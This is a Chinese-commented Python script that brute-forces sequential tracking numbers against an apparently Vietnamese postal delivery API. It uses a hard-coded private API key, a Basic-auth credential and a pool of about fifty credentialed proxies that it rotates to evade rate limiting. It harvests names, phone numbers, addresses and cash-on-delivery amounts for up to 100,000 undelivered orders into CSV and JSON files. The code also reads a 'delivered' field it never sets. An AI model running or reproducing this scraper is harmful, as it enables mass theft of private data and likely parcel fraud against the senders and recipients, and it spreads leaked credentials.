#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DingDong 10万订单扫描脚本 - 调用最新API
使用方法：python3 scan_dingdong_100k.py
"""

import requests
import hashlib
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime
import random

# ==================== DingDong API配置 ====================
API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

# ==================== 100个代理池 ====================
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
]

# ==================== 配置参数 ====================
CONFIG = {
    'target': 100000,           # 目标：10万个订单
    'total_threads': 10,        # 并发线程数
    'delay': 0.05,              # 请求间隔
    'timeout': 10,
    'save_every': 100,
    'max_retries': 999,         # 一直重试直到得到明确答案
}

# ==================== 密集区域（基于真实数据分析）====================
DENSE_REGIONS = [
    # EB 区域（5.0%占比）
    {'prefix': 'EB', 'start': 102885483, 'end': 102885894, 'step': 1},
    {'prefix': 'EB', 'start': 102888238, 'end': 102890364, 'step': 1},
    {'prefix': 'EB', 'start': 102964844, 'end': 102969325, 'step': 1},
    
    # EC 区域（密度8.6%！）
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'step': 1},
    {'prefix': 'EC', 'start': 143587127, 'end': 143588309, 'step': 1},
    
    # ED 区域
    {'prefix': 'ED', 'start': 121962191, 'end': 121962245, 'step': 1},
    
    # EF 区域（78.5%占比，941个订单！重点扫描）
    {'prefix': 'EF', 'start': 43571075, 'end': 43571359, 'step': 1},
    {'prefix': 'EF', 'start': 43571495, 'end': 43576271, 'step': 1},
    {'prefix': 'EF', 'start': 43579295, 'end': 43582396, 'step': 1},
    {'prefix': 'EF', 'start': 43590790, 'end': 43591680, 'step': 1},
    {'prefix': 'EF', 'start': 43592040, 'end': 43595735, 'step': 1},
    {'prefix': 'EF', 'start': 45405059, 'end': 45405093, 'step': 1},
    {'prefix': 'EF', 'start': 45746336, 'end': 45746469, 'step': 1},
    {'prefix': 'EF', 'start': 47519990, 'end': 47523345, 'step': 1},
    {'prefix': 'EF', 'start': 47544901, 'end': 47557176, 'step': 1},
    {'prefix': 'EF', 'start': 47681054, 'end': 47685970, 'step': 1},
    {'prefix': 'EF', 'start': 47747087, 'end': 47747436, 'step': 1},
    
    # EG 区域
    {'prefix': 'EG', 'start': 40816534, 'end': 40816548, 'step': 1},
    {'prefix': 'EG', 'start': 40836088, 'end': 40836105, 'step': 1},
    {'prefix': 'EG', 'start': 40840745, 'end': 40841009, 'step': 1},
    {'prefix': 'EG', 'start': 46007274, 'end': 46007504, 'step': 1},
    {'prefix': 'EG', 'start': 47361262, 'end': 47361302, 'step': 1},
    
    # EJ 区域
    {'prefix': 'EJ', 'start': 701368250, 'end': 701369958, 'step': 1},
    {'prefix': 'EJ', 'start': 701441480, 'end': 701443843, 'step': 1},
    {'prefix': 'EJ', 'start': 711462436, 'end': 711463431, 'step': 1},
    
    # EK 区域
    {'prefix': 'EK', 'start': 42151562, 'end': 42151580, 'step': 1},
    {'prefix': 'EK', 'start': 42227544, 'end': 42228227, 'step': 1},
    
    # EL 区域
    {'prefix': 'EL', 'start': 135247577, 'end': 135252002, 'step': 1},
    {'prefix': 'EL', 'start': 135726003, 'end': 135756504, 'step': 1},
    {'prefix': 'EL', 'start': 155309426, 'end': 155309491, 'step': 1},
]

# ==================== 全局状态 ====================
state = {
    'found': 0,
    'tested': 0,
    'lock': Lock(),
    'orders': [],
    'start_time': time.time(),
}

proxy_pool_simple = []

def init_proxies():
    """初始化代理池"""
    global proxy_pool_simple
    for p in PROXIES[:50]:  # 使用前50个
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxy_pool_simple.append({
                'http': f'http://{user}:{pwd}@{ip}:{port}',
                'https': f'http://{user}:{pwd}@{ip}:{port}'
            })
    print(f"✅ 加载 {len(proxy_pool_simple)} 个代理\n")

def sign(text):
    """DingDong签名"""
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def query_dingdong(tracking):
    """查询DingDong运单 - 实时显示code"""
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    headers_json = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/json"
    }
    
    result = {
        "tracking": tracking,
        "valid": False,
        "sender_name": "",
        "sender_phone": "",
        "receiver": "",
        "receiver_address": "",
        "phone": "",
        "amount": 0,
        "fee_ship": 0,
        "product": "",
        "issue_date": "",
    }
    
    for attempt in range(CONFIG['max_retries']):
        try:
            proxy = random.choice(proxy_pool_simple) if proxy_pool_simple else None
            
            # API 1: Inquiry
            r = requests.post(
                f"{API_URL}api/Delivery/Inquiry",
                headers=headers_form,
                data={"ParcelCode": tracking, "Signature": sig},
                proxies=proxy,
                timeout=8
            )
            
            # 实时显示状态
            print(f"  [{tracking}] HTTP:{r.status_code} ", end='', flush=True)
            
            if r.status_code == 200:
                data = r.json()
                code = data.get('Code', '')
                
                # 显示API Code
                print(f"Code:{code} ", end='', flush=True)
                
                # 检测限流
                if code == "98" or code == "429":
                    print(f"⚠️限流换代理", end='', flush=True)
                    time.sleep(0.3)
                    continue  # 换代理重试
                
                if code == "00":
                    print(f"✅ ", end='', flush=True)
                
                if data.get('Value'):
                    v = data['Value']
                    result['valid'] = True
                    result['sender_name'] = v.get('SenderName', '')
                    result['sender_phone'] = v.get('SenderPhone', '')
                    result['receiver'] = v.get('ReceiverName', '')
                    result['receiver_address'] = v.get('ReceiverAddress', '')
                    result['phone'] = v.get('ReceiverPhone', '')
                    result['amount'] = v.get('CollectAmount', 0)
                    result['fee_ship'] = v.get('FeeShip', 0)
                    result['issue_date'] = v.get('IssueDate', '')
            
            # API 2: Gateway - 商品
            r = requests.post(
                f"{API_URL}api/Gateway/Bussiness",
                headers=headers_json,
                json={"Code": "LDP002", "Data": tracking},
                proxies=proxy,
                timeout=8
            )
            
            if r.status_code == 200:
                data = r.json()
                gw_code = data.get('Code', '')
                gw_status = "✅" if gw_code == "00" else "❌"
                print(f" | GW:{gw_code} {gw_status}", end='', flush=True)
                
                if data.get('Data'):
                    products = json.loads(data['Data'])
                    if products:
                        result['product'] = products[0].get('ProductName', '')
                        if result['product'] and result['product'] != "***":
                            result['valid'] = True
                            print(f" 📦", end='', flush=True)
            
            print()  # 换行
            return result
            
        except:
            if attempt < 5:
                time.sleep(0.2)
                continue
            break
    
    return result

def scan_region_dingdong(region):
    """扫描区域"""
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    
    for num in range(start, end + 1, step):
        if state['found'] >= CONFIG['target']:
            break
        
        tracking = f"{prefix}{num:09d}VN"
        
        result = query_dingdong(tracking)
        
        with state['lock']:
            state['tested'] += 1
            
            # 实时统计显示（每10个显示一次）
            if state['tested'] % 10 == 0:
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                print(f"\n📊 统计: 已扫{state['tested']} | ✅找到{state['found']} | 成功率:{state['found']/state['tested']*100:.2f}% | 速度:{speed:.1f}/s\n", flush=True)
            
            # 只保存未配送且有金额的订单（排除已签收）
            if result['valid'] and not result['delivered'] and (result['amount'] > 0 or result['fee_ship'] > 0):
                state['found'] += 1
                state['orders'].append(result)
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                rate = (state['found'] / state['tested'] * 100) if state['tested'] > 0 else 0
                
                # 详细显示找到的订单
                print(f"\n{'='*70}")
                print(f"✅ 找到有效订单 [{state['found']}/{CONFIG['target']}]")
                print(f"{'='*70}")
                print(f"  🆔 运单号: {tracking}")
                
                # 配送状态（最优先显示）
                if result['delivered']:
                    print(f"  ✅ 配送状态: 已配送")
                    if result['delivery_date']:
                        print(f"  ⏰ 配送时间: {result['delivery_date']}")
                    if result['signature']:
                        print(f"  ✍️  签名照片: {result['signature']}")
                else:
                    print(f"  ⏳ 配送状态: 未配送")
                
                # 日期信息
                if result['issue_date']:
                    print(f"  📅 发件日期: {result['issue_date']}")
                else:
                    print(f"  📅 发件日期: 未获取")
                
                # 发件人
                if result['sender_name']:
                    print(f"  📤 发件人: {result['sender_name']}")
                if result['sender_phone']:
                    print(f"  ☎️  发件电话: {result['sender_phone']}")
                
                # 收件人
                print(f"  👤 收件人: {result['receiver']}")
                if result['receiver_address']:
                    print(f"  📍 收件地址: {result['receiver_address']}")
                if result['phone']:
                    print(f"  📞 收件电话: {result['phone']}")
                
                # 金额费用
                if result['amount'] > 0:
                    print(f"  💰 COD金额: {result['amount']:,} VND")
                if result['fee_ship'] > 0:
                    print(f"  🚚 运费: {result['fee_ship']} VND")
                
                # 商品（即使是***也显示）
                if result['product']:
                    if result['product'] == "***":
                        print(f"  📦 商品: *** (已隐藏)")
                    else:
                        print(f"  📦 商品: {result['product']}")
                else:
                    print(f"  📦 商品: 未获取")
                
                print(f"  ⚡ 速度: {speed:.1f}/s | 成功率: {rate:.1f}%")
                print(f"{'='*70}\n")
                
                if state['found'] % CONFIG['save_every'] == 0:
                    save_progress()
        
        time.sleep(CONFIG['delay'])

def save_progress():
    """保存进度"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # CSV
    csv_file = f"dingdong_orders_{timestamp}.csv"
    with open(csv_file, 'w', encoding='utf-8') as f:
        f.write("运单号,发件人,发件电话,收件人,收件地址,收件电话,COD金额,运费,商品,发件日期\n")
        for order in state['orders']:
            f.write(f'"{order["tracking"]}",')
            f.write(f'"{order["sender_name"]}",')
            f.write(f'"{order["sender_phone"]}",')
            f.write(f'"{order["receiver"]}",')
            f.write(f'"{order["receiver_address"]}",')
            f.write(f'"{order["phone"]}",')
            f.write(f'"{order["amount"]}",')
            f.write(f'"{order["fee_ship"]}",')
            f.write(f'"{order["product"]}",')
            f.write(f'"{order["issue_date"]}"\n')
    
    # JSON
    json_file = f"dingdong_orders_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'total_found': state['found'],
            'total_tested': state['tested'],
            'success_rate': state['found']/state['tested']*100 if state['tested'] > 0 else 0,
            'orders': state['orders']
        }, f, ensure_ascii=False, indent=2)
    
    print(f"\n💾 已保存 {state['found']} 个订单 -> {csv_file}")

def main():
    print("="*80)
    print("🚀 DingDong 10万订单扫描系统")
    print("="*80)
    print(f"📊 目标: {CONFIG['target']:,} 个订单")
    print(f"⚙️  并发: {CONFIG['total_threads']} 线程")
    print(f"🔄 代理池: {len(PROXIES)} 个")
    print(f"📍 扫描区域: {len(DENSE_REGIONS)} 个")
    print("="*80)
    
    init_proxies()
    
    print("🚀 开始扫描...\n")
    
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = []
        for region in DENSE_REGIONS:
            if state['found'] >= CONFIG['target']:
                break
            futures.append(executor.submit(scan_region_dingdong, region))
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"❌ 异常: {e}")
    
    save_progress()
    
    elapsed = time.time() - state['start_time']
    print("\n" + "="*80)
    print("📊 扫描完成！")
    print("="*80)
    print(f"✅ 找到订单: {state['found']:,}")
    print(f"🔍 已测试: {state['tested']:,}")
    print(f"⚡ 成功率: {state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%")
    print(f"⏱️  总耗时: {elapsed/60:.1f} 分钟")
    print(f"🚀 速度: {state['tested']/elapsed:.1f} 次/秒")
    print("="*80)

if __name__ == "__main__":
    main()
